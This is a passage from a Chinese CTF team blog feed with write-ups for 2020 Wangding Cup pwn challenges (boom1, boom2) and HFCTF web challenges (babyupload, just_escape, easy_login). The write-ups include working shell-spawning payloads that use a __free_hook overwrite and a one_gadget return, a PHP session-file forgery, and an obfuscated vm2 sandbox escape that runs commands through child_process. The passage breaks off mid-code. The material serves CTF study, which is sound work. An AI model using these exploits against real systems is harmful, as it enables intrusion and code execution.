    <content type="html"><![CDATA[<h2 id="boom1"><a href="#boom1" class="headerlink" title="boom1"></a>boom1</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>boom1打开后看起来内容很多，其实很多内容都不需要逆向。首先看到下面这个字符串时，已经大致猜到了什么：</p><p><img src="/2020/05/07/2020_boom1/image-20200511101514250.png" alt="image-20200511101514250"></p><p>这就类似于高级语言预订的一些关键词，那么也就是，我们用这些东西来写程序就好了。</p><p>在后面的动态运行中，我发现了，需要定义main函数，以及需要分号作为结尾。而且函数只能运行一次：</p><p><img src="/2020/05/07/2020_boom1/image-20200511101754172.png" alt="image-20200511101754172"></p><p>否则就会打印NOTALLOW。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>修改__free_hook为system，最后调用free(“/bin/sh”);</p><p>这个程序会把我们写好的程序的变量之类的，放置在malloc的区域，而此时malloc的大小是0x40000的，也就是这一空间必然是mmap出的新空间，且与libc是相邻的，那么我们就不需要知道libc的基地址，而直接通过偏移去得到__free_hook和system的地址。</p><h3 id="pwn！！！"><a href="#pwn！！！" class="headerlink" title="pwn！！！"></a>pwn！！！</h3><p>首先判断libc版本，在内存中，其实是有libc版本记录的地方，在peda中使用类似:<code>find 2.23</code>，这样的语句就可以找到，而且总是有一个地址是与0x8对齐的，因为我们这里计算的偏移都是以0x8为一个单位。最后我计算出这个偏移为471879。计算方法就是用定义的a的地址减去目标地址，最后除以8。</p><p><img src="/2020/05/07/2020_boom1/image-20200511102438106.png" alt="image-20200511102438106"></p><p>可以看到，此时打印2.23，那么原创也可以测试出来就是2.23的libc版本。</p><p>最后用类似的方法计算出free_hook和system的值就好了：</p><p><img src="/2020/05/07/2020_boom1/image-20200511102639601.png" alt="image-20200511102639601"></p><p>最后的payload：<code>main(){int a;*(&amp;a-180998)=&amp;a-640393;free(&quot;/bin/sh&quot;);}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;boom1&quot;&gt;&lt;a href=&quot;#boom1&quot; class=&quot;headerlink&quot; title=&quot;boom1&quot;&gt;&lt;/a&gt;boom1&lt;/h2&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="https://boiteam.github.io/categories/Pwn/"/>
    
    
      <category term="libc" scheme="https://boiteam.github.io/tags/libc/"/>
    
  </entry>
  
  <entry>
    <title>2020 网鼎杯 boom2</title>
    <link href="https://boiteam.github.io/2020/05/07/2020_boom2/"/>
    <id>https://boiteam.github.io/2020/05/07/2020_boom2/</id>
    <published>2020-05-07T05:54:17.000Z</published>
    <updated>2020-05-14T01:00:23.324Z</updated>
    
    <content type="html"><![CDATA[<h2 id="boom2"><a href="#boom2" class="headerlink" title="boom2"></a>boom2</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>boom2是需要逆向的一道题目：</p><p>我只说几个关键的逆向：</p><h4 id="大体机制"><a href="#大体机制" class="headerlink" title="大体机制"></a>大体机制</h4><p>本题主要是一个栈空间，附带一个寄存器。</p><p>我们输入指令的时候需要一个指令占64bit，也就是8个字节</p><h4 id="push指令–13"><a href="#push指令–13" class="headerlink" title="push指令–13"></a>push指令–13</h4><p>直接p64(13)就是push。</p><p><img src="/2020/05/07/2020_boom2/image-20200511103128303.png" alt="image-20200511103128303"></p><h4 id="pop操作指令–后面全都是"><a href="#pop操作指令–后面全都是" class="headerlink" title="pop操作指令–后面全都是"></a>pop操作指令–后面全都是</h4><p>直接p64(指令)，就是寄存器和pop出值得运算</p><p><img src="/2020/05/07/2020_boom2/image-20200511103209604.png" alt="image-20200511103209604"></p><h4 id="给寄存器赋值的方式"><a href="#给寄存器赋值的方式" class="headerlink" title="给寄存器赋值的方式"></a>给寄存器赋值的方式</h4><p><img src="/2020/05/07/2020_boom2/image-20200511103333685.png" alt="image-20200511103333685"></p><p>指令0：p64(0)+p64(offset)   把相对于bp为offset的地址赋值给寄存器</p><p>指令1：p64(1)+p64(num)   把num赋值给寄存器</p><h4 id="给pop出的地址赋值"><a href="#给pop出的地址赋值" class="headerlink" title="给pop出的地址赋值"></a>给pop出的地址赋值</h4><p><img src="/2020/05/07/2020_boom2/image-20200511103502751.png" alt="image-20200511103502751"></p><p>直接p64(11)就是把pop出的一个地址，将寄存器的值赋值给pop出地址中的内容。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>有了这些东西，思路就很简单了，找到_environ的值，计算出EIP的值，更换成one_gadget。</p><h3 id="exp-主体"><a href="#exp-主体" class="headerlink" title="exp 主体"></a>exp 主体</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">one = <span class="number">0xf1147</span></span><br><span class="line">ru(<span class="string">"Input your code&gt; "</span>)</span><br><span class="line">payload = p64(<span class="number">1</span>)+p64(<span class="number">18446744073709551376</span>)<span class="comment">#tmp=-0xf0</span></span><br><span class="line">payload += p64(<span class="number">13</span>) <span class="comment">#push -0xf0</span></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">18446744073709271013</span>)<span class="comment">#0x7f96e2df6010 get _environ address</span></span><br><span class="line">payload += p64(<span class="number">9</span>) <span class="comment">#get _environ</span></span><br><span class="line">payload += p64(<span class="number">25</span>) <span class="comment">#_environ-0xf0(EIP)</span></span><br><span class="line">payload += p64(<span class="number">13</span>) <span class="comment">#push EIP</span></span><br><span class="line">payload += p64(<span class="number">1</span>)+p64(one)<span class="comment">#tmp= onegadget offset</span></span><br><span class="line">payload += p64(<span class="number">13</span>) <span class="comment">#push tmp</span></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">18446744073708775934</span>)<span class="comment">#libc_start</span></span><br><span class="line">payload += p64(<span class="number">25</span>) <span class="comment">#tmp = libc_start+tmp</span></span><br><span class="line">payload += p64(<span class="number">11</span>) <span class="comment">#edit EIP</span></span><br><span class="line">debug()</span><br><span class="line">s(payload)</span><br><span class="line">getshell()</span><br></pre></td></tr></table></figure><p>最后：</p><p><img src="/2020/05/07/2020_boom2/image-20200511103849331.png" alt="image-20200511103849331"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;boom2&quot;&gt;&lt;a href=&quot;#boom2&quot; class=&quot;headerlink&quot; title=&quot;boom2&quot;&gt;&lt;/a&gt;boom2&lt;/h2&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="https://boiteam.github.io/categories/Pwn/"/>
    
    
      <category term="libc" scheme="https://boiteam.github.io/tags/libc/"/>
    
  </entry>
  
  <entry>
    <title>2020 虎符网络安全大赛  babyupload</title>
    <link href="https://boiteam.github.io/2020/04/19/2020_HFCTF_babyupload/"/>
    <id>https://boiteam.github.io/2020/04/19/2020_HFCTF_babyupload/</id>
    <published>2020-04-19T05:54:17.000Z</published>
    <updated>2020-04-21T00:17:21.741Z</updated>
    
    <content type="html"><![CDATA[<p>首先是源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_save_path(<span class="string">"/var/babyctf/"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"/flag"</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] ===<span class="string">'admin'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $filename=<span class="string">'/var/babyctf/success.txt'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">            safe_delete($filename);</span><br><span class="line">            <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] =<span class="string">'guest'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$direction = filter_input(INPUT_POST, <span class="string">'direction'</span>);</span><br><span class="line">$attr = filter_input(INPUT_POST, <span class="string">'attr'</span>);</span><br><span class="line">$dir_path = <span class="string">"/var/babyctf/"</span>.$attr;</span><br><span class="line"><span class="keyword">if</span>($attr===<span class="string">"private"</span>)&#123;</span><br><span class="line">    $dir_path .= <span class="string">"/"</span>.$_SESSION[<span class="string">'username'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($direction === <span class="string">"upload"</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_uploaded_file($_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'invalid upload'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $file_path = $dir_path.<span class="string">"/"</span>.$_FILES[<span class="string">'up_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_path .= <span class="string">"_"</span>.hash_file(<span class="string">"sha256"</span>,$_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\.\.\/|\.\.\\\\)/'</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'invalid file path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @mkdir($dir_path, <span class="number">0700</span>, <span class="keyword">TRUE</span>);</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">'up_file'</span>][<span class="string">'tmp_name'</span>],$file_path))&#123;</span><br><span class="line">            $upload_result = <span class="string">"uploaded"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'error while saving'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException $e) &#123;</span><br><span class="line">        $upload_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">elseif</span> ($direction === <span class="string">"download"</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        $filename = basename(filter_input(INPUT_POST, <span class="string">'filename'</span>));</span><br><span class="line">        $file_path = $dir_path.<span class="string">"/"</span>.$filename;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\.\.\/|\.\.\\\\)/'</span>, $file_path))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'invalid file path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists($file_path)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'file not exist'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        header(<span class="string">'Content-Type: application/force-download'</span>);</span><br><span class="line">        header(<span class="string">'Content-Length: '</span>.filesize($file_path));</span><br><span class="line">        header(<span class="string">'Content-Disposition: attachment; filename="'</span>.substr($filename, <span class="number">0</span>, <span class="number">-65</span>).<span class="string">'"'</span>);</span><br><span class="line">        <span class="keyword">if</span>(readfile($file_path))&#123;</span><br><span class="line">            $download_result = <span class="string">"downloaded"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">'error while saving'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException $e) &#123;</span><br><span class="line">        $download_result = $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个题目只要有两个功能，<code>上传</code>和<code>下载</code>文件</p><p>我们要得到flag需要满足一下条件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] ===<span class="string">'admin'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $filename=<span class="string">'/var/babyctf/success.txt'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">            safe_delete($filename);</span><br><span class="line">            <span class="keyword">die</span>($flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先这道题目没有任何的<code>session</code>复制点，所以我们能想到的就是上传一个<code>sess_xxxxxxxx</code>文件来覆盖原有的<code>sess</code>文件</p><h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><ul><li><p>先下载一个sess文件，看格式是什么样子的<br>  <img src="https://img-blog.csdnimg.cn/20200419184847984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">这儿我们看到sess文件的格式为<code>0x08usernames:5:&quot;guest&quot;;</code><br>注意前面还有一个<code>0x08</code>不可见字符，开始我没有加进去，就没做出来</p></li><li><p>上传sess文件</p><pre><code>$file_path = $dir_path.&quot;/&quot;.$_FILES[&apos;up_file&apos;][&apos;name&apos;];$file_path .= &quot;_&quot;.hash_file(&quot;sha256&quot;,$_FILES[&apos;up_file&apos;][&apos;tmp_name&apos;]);</code></pre><p>这儿我们只需要将<code>$_FILES[&#39;up_file&#39;][&#39;name&#39;]</code>改为sess就可以了，这样就满足sess文件的命名形式</p></li><li><p>新创<code>success.txt</code>文件夹<br><code>file_exists($filename)</code>，其中<code>$filename</code>是一个文件夹，也满足条件</p></li><li><p>修改PHHSESSID，然后刷新页面就可以得到<code>flag</code></p></li></ul><p>​        修改sess<br><img src="https://img-blog.csdnimg.cn/20200419185450546.png" alt="在这里插入图片描述"></p><p>运行<code>hash_file</code>函数，得到哈希值<br><img src="https://img-blog.csdnimg.cn/20200419185534256.png" alt="在这里插入图片描述"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">432</span>b<span class="number">8</span>b<span class="number">09e30</span><span class="keyword">c</span><span class="number">4</span>a<span class="number">75986</span>b<span class="number">719</span>d<span class="number">1312</span>b<span class="number">63</span>a<span class="number">69</span>f<span class="number">1</span>b<span class="number">833</span>ab<span class="number">602</span><span class="keyword">c</span><span class="number">9</span>ad<span class="number">5</span>f<span class="number">0299</span>d<span class="number">1</span>d<span class="number">76</span>a<span class="number">5</span>a<span class="number">4</span></span><br></pre></td></tr></table></figure><p>然后上传文件，我们需要上传两次，一次覆盖<code>sess</code>，一次创建<code>success.txt</code>文件夹</p><ul><li>上传sess文件<br><img src="https://img-blog.csdnimg.cn/2020041918580338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>这个时候<code>attr</code>置空<br></li><li>新建<code>success.txt</code>文件夹<br><img src="https://img-blog.csdnimg.cn/20200419185926714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><p>然后替换<code>PHPSESSID</code>值</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">432</span>b<span class="number">8</span>b<span class="number">09e30</span><span class="keyword">c</span><span class="number">4</span>a<span class="number">75986</span>b<span class="number">719</span>d<span class="number">1312</span>b<span class="number">63</span>a<span class="number">69</span>f<span class="number">1</span>b<span class="number">833</span>ab<span class="number">602</span><span class="keyword">c</span><span class="number">9</span>ad<span class="number">5</span>f<span class="number">0299</span>d<span class="number">1</span>d<span class="number">76</span>a<span class="number">5</span>a<span class="number">4</span></span><br></pre></td></tr></table></figure><p>刷新页面就可以了<br><img src="https://img-blog.csdnimg.cn/20200419190051986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;首先是源代码&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="PHP" scheme="https://boiteam.github.io/categories/Web/PHP/"/>
    
    
      <category term="Web_JWT" scheme="https://boiteam.github.io/tags/Web-JWT/"/>
    
  </entry>
  
  <entry>
    <title>2020 虎符网络安全大赛  just_escape</title>
    <link href="https://boiteam.github.io/2020/04/19/2020_HFCTF_just_escape/"/>
    <id>https://boiteam.github.io/2020/04/19/2020_HFCTF_just_escape/</id>
    <published>2020-04-19T05:54:17.000Z</published>
    <updated>2020-04-19T12:58:16.869Z</updated>
    
    <content type="html"><![CDATA[<p>进入这个页面</p><p><img src="https://img-blog.csdnimg.cn/20200419183533592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>然后显示的是一个php的任意代码执行的页面，但是经过测试，这个根本就是<code>php</code>，其实题目也有提示</p><p>我们输入<code>Error().stack</code></p><p><img src="https://img-blog.csdnimg.cn/20200419183814905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>可以根据回显得到，这是一个<code>JS</code>的<code>vm2</code>，而且经过测试许多关键字都被过滤</p><br><p>所以我们使用字符串拼接就可以了~~</p><p>然后我们去网上找一下关于<code>vm2</code>的<code>payload</code><br><img src="https://img-blog.csdnimg.cn/20200419184039790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">所以最终的payload为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(function ()&#123;</span><br><span class="line">    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return proc`&#125;ess`&#125;`)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        Object.preventExtensions(Buffer.<span class="keyword">from</span>(``)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        return e[`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`ls /`).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200419184218599.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200419184302936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这儿不需要<code>url</code>编码，直接将上面<code>payload</code>复制进<code>url</code>栏就i可以了</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;进入这个页面&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="JS" scheme="https://boiteam.github.io/categories/Web/JS/"/>
    
    
      <category term="Web_VM逃逸" scheme="https://boiteam.github.io/tags/Web-VM%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>2020 虎符网络安全大赛   easy_login</title>
    <link href="https://boiteam.github.io/2020/04/19/2020_HFCTF_easy_login/"/>
    <id>https://boiteam.github.io/2020/04/19/2020_HFCTF_easy_login/</id>
    <published>2020-04-19T05:54:17.000Z</published>
    <updated>2020-04-19T12:58:57.583Z</updated>
    
    <content type="html"><![CDATA[<p>先扫一下目录</p><img src="https://img-blog.csdnimg.cn/20200419190749624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" style="zoom:80%;"><p>首先这是一个<code>koa</code>框架，所以我们先熟悉一下这个框架的目录结构</p><p><img src="https://img-blog.csdnimg.cn/2020041919290348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2EzMzIwMzE1,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后访问<code>/controllers/api.js</code>得到逻辑代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">'jsonwebtoken'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> APIError = <span class="built_in">require</span>(<span class="string">'../rest'</span>).APIError;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="string">'POST /api/register'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'register error'</span>, <span class="string">'wrong username'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(global.secrets.length &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">            global.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">'hex'</span>);</span><br><span class="line">        <span class="keyword">const</span> secretid = global.secrets.length;</span><br><span class="line">        global.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">'HS256'</span>&#125;);</span><br><span class="line">        </span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line">    </span><br><span class="line">    <span class="string">'POST /api/login'</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || !password) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'username or password is necessary'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">'.'</span>)[<span class="number">1</span>], <span class="string">'base64'</span>).toString()).secretid;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(sid)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'no such secret id'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = global.secrets[sid];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">'HS256'</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span 